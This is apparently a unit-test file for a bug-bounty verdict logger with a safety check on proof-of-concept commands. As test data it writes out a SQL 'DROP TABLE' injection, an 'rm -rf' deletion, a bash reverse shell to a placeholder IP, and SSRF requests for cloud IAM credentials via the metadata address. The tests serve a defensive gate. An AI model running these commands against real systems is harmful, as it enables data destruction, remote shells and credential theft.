"""
Stage 1b — Validator-gate unit tests.
Run from mcp_server/ directory: python3 test_verdicts.py
"""

import sys
import shutil
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

PASS = '\033[0;32m[PASS]\033[0m'
FAIL = '\033[0;31m[FAIL]\033[0m'
HEAD = '\033[1;36m'
NC   = '\033[0m'

results = {'passed': 0, 'failed': 0}


def section(title: str):
    print(f'\n{HEAD}━━━ {title} ━━━{NC}')


def check(label: str, condition: bool, detail: str = ''):
    if condition:
        print(f'  {PASS} {label}')
        results['passed'] += 1
    else:
        print(f'  {FAIL} {label}')
        if detail:
            print(f'         → {detail}')
        results['failed'] += 1


# ── Patch VAULT_ROOT to a clean temp dir before importing verdicts ─────────────
import config
TEST_VAULT = Path('/tmp/bb_test_verdicts_vault')
shutil.rmtree(TEST_VAULT, ignore_errors=True)
TEST_VAULT.mkdir(parents=True)
config.VAULT_ROOT = TEST_VAULT

import importlib
import core.verdicts as verdicts
importlib.reload(verdicts)

PROGRAM      = 'test_program'
PROGRAM_OTHER = 'other_program'

# ══════════════════════════════════════════════════════════════════════════════
section('1. safety_check — destructive PoC patterns rejected')

ok, _ = verdicts.safety_check("curl -X POST 'https://t/api?id=1; DROP TABLE users--'")
check('DROP TABLE → rejected', not ok)

ok, _ = verdicts.safety_check('rm -rf /var/www/uploads')
check('rm -rf → rejected', not ok)

ok, _ = verdicts.safety_check('bash -i >& /dev/tcp/1.2.3.4/4444 0>&1')
check('reverse-shell pattern → rejected', not ok)

ok, _ = verdicts.safety_check('')
check('empty PoC → rejected', not ok)

ok, _ = verdicts.safety_check("curl 'https://t/api?id=1%27%20OR%201=1--'")
check('safe SQLi probe → accepted', ok)

ok, _ = verdicts.safety_check('GET /metadata HTTP/1.1\nHost: 169.254.169.254')
check('safe IMDS read → accepted', ok)

# ══════════════════════════════════════════════════════════════════════════════
section('2. create + get — AWAITING lifecycle')

vid1 = verdicts.create(
    program=PROGRAM,
    hypothesis='SSRF in /api/fetch via url param',
    target='api.test.com',
    evidence='HTTP 200 from internal endpoint reflected',
    proposed_poc='curl "https://api.test.com/api/fetch?url=http://169.254.169.254/"',
)
check('create() returns a UUID-shaped id', len(vid1) == 36 and vid1.count('-') == 4)

v = verdicts.get(vid1)
check('get() finds the created verdict', v is not None and v['verdict_id'] == vid1)
check('initial status is AWAITING', v['status'] == verdicts.VERDICT_AWAITING)
check('hash chain populated', 'hash' in v and 'prev_hash' in v)

# ══════════════════════════════════════════════════════════════════════════════
section('3. record — finalize lifecycle')

ok, _ = verdicts.record(vid1, verdicts.VERDICT_EXPLOITABLE,
                        reasoning='IMDS reachable, returns metadata',
                        validated_poc='curl "https://api.test.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"')
check('record EXPLOITABLE returns ok', ok)

v = verdicts.get(vid1)
check('status now EXPLOITABLE', v['status'] == verdicts.VERDICT_EXPLOITABLE)
check('reasoning persisted', 'IMDS reachable' in (v.get('reasoning') or ''))
check('validated_poc persisted', 'security-credentials' in (v.get('validated_poc') or ''))

# Cannot record twice
ok, msg = verdicts.record(vid1, verdicts.VERDICT_THEORETICAL, reasoning='change my mind')
check('double-record rejected', not ok and 'already finalized' in msg)

# Bad verdict string rejected
vid2 = verdicts.create(PROGRAM, 'h', 't.test.com', 'e', 'curl https://t.test.com/')
ok, msg = verdicts.record(vid2, 'MAYBE', reasoning='dunno')
check('invalid verdict string rejected', not ok)

# Recording unknown verdict_id rejected
ok, msg = verdicts.record('00000000-0000-0000-0000-000000000000',
                          verdicts.VERDICT_EXPLOITABLE, reasoning='x')
check('unknown verdict_id rejected', not ok and 'not found' in msg)

# ══════════════════════════════════════════════════════════════════════════════
section('4. cross-program isolation')

vid_other = verdicts.create(
    program=PROGRAM_OTHER,
    hypothesis='IDOR on /accounts/{id}',
    target='other.test.com',
    evidence='200 OK reading another account',
    proposed_poc='curl https://other.test.com/accounts/1',
)
verdicts.record(vid_other, verdicts.VERDICT_EXPLOITABLE, reasoning='IDOR confirmed')

v = verdicts.get(vid_other)
check('cross-program verdict found by id', v is not None and v['program'] == PROGRAM_OTHER)
check('cross-program verdict has correct status',
      v['status'] == verdicts.VERDICT_EXPLOITABLE)

# ══════════════════════════════════════════════════════════════════════════════
section('5. THEORETICAL verdict pathway')

vid3 = verdicts.create(PROGRAM, 'XSS via referrer', 't.test.com', 'header reflected', 'craft a referer')
ok, _ = verdicts.record(vid3, verdicts.VERDICT_THEORETICAL,
                        reasoning='referer is not user-controlled in any modern browser')
check('record THEORETICAL returns ok', ok)
v = verdicts.get(vid3)
check('THEORETICAL verdict persisted', v['status'] == verdicts.VERDICT_THEORETICAL)

# ══════════════════════════════════════════════════════════════════════════════
section('6. hash-chain integrity')

ok, msg = verdicts.verify(PROGRAM)
check(f'verify(PROGRAM) — {msg}', ok)
ok, msg = verdicts.verify(PROGRAM_OTHER)
check(f'verify(PROGRAM_OTHER) — {msg}', ok)

# Tamper test — flip a byte and verify breaks
log_path = TEST_VAULT / PROGRAM / 'verdicts' / 'verdicts.jsonl'
content = log_path.read_text()
tampered = content.replace('SSRF', 'XXRF', 1)
if tampered != content:
    log_path.write_text(tampered)
    ok, msg = verdicts.verify(PROGRAM)
    check('tamper detected by verify', not ok)
    # Restore so tests are idempotent
    log_path.write_text(content)
else:
    check('tamper test setup', False, 'could not produce a different content')

# ══════════════════════════════════════════════════════════════════════════════
section('7. safety_check chained with create')

# A well-shaped flow: safety_check first, then create
poc = "curl -H 'X-Intigrity-Username: tester' 'https://api.test.com/admin'"
ok, _ = verdicts.safety_check(poc)
check('safety_check passes for benign curl', ok)
vid_safe = verdicts.create(PROGRAM, 'admin probe', 'api.test.com', 'redirect 302', poc)
v = verdicts.get(vid_safe)
check('verdict opens cleanly after safety_check', v is not None)

# ══════════════════════════════════════════════════════════════════════════════
total = results['passed'] + results['failed']
print(f'\n{"━"*45}')
print(f' Results: {results["passed"]}/{total} passed', end='')
if results['failed'] == 0:
    print(f'  \033[0;32m✅ All tests passed\033[0m')
else:
    print(f'  \033[0;31m❌ {results["failed"]} failed\033[0m')
print(f'{"━"*45}\n')

shutil.rmtree(TEST_VAULT, ignore_errors=True)

sys.exit(0 if results['failed'] == 0 else 1)
